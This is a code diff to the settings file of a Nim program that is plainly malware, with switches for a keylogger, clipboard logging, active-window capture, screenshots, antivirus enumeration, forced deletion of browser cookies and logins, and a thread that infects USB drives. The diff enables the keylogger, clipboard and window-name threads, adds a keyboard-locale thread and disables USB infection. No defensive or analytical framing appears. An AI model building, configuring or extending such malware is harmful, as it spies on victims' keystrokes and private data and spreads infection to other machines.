@@ -18,7 +18,7 @@ const USE_PERSISTENCE_THREAD*: bool = false
 ## clipboardThread is used for logging the clipboard
 ## every time it changes
 ## DEFAULT: true
-const USE_CLIPBOARD_THREAD*: bool = false
+const USE_CLIPBOARD_THREAD*: bool = true
 
 ## getAVSThread is used for getting
 ## all the installed antivirus software on the user's pc
@@ -38,7 +38,7 @@ const USE_CONNECTED_WIFI_THREAD*: bool = false
 ## windowNameThread is used for getting the active window name
 ## best used alongside keyloggerThread
 ## DEFAULT: true
-const USE_WINDOW_NAME_THREAD*: bool = false
+const USE_WINDOW_NAME_THREAD*: bool = true
 
 ## screenshotThread is used for saving screenshots
 ## DEFAULT: true
@@ -46,7 +46,12 @@ const USE_SCREENSHOT_THREAD*: bool = false
 
 ## keyloggerThread is used for logging key presses
 ## DEFAULT: true
-const USE_KEYLOGGER_THREAD*: bool = false
+const USE_KEYLOGGER_THREAD*: bool = true
+
+## keyboardLocale is used for getting the keyboard locale changes
+## by default its activated when the keyloggerThread is
+## DEFAULT: USE_KEYLOGGER_THREAD
+const USE_KEYBOARD_LOCALE_THREAD*: bool = USE_KEYLOGGER_THREAD
 
 ## browserThread is used for deleting cookies and login data
 ## so the user is forced to login back again
@@ -62,7 +67,7 @@ const UNSAFE_REMOVE_FILE*: bool = false
 
 ## infectThread is used for searching usb drives and infecting them
 ## DEFAULT: true
-const USE_INFECT_THREAD*: bool = true
+const USE_INFECT_THREAD*: bool = false
 
 ## the key files on a usb drive will be infected with
 ## YOU MUST add e before " to encrypt the key so it can't be read
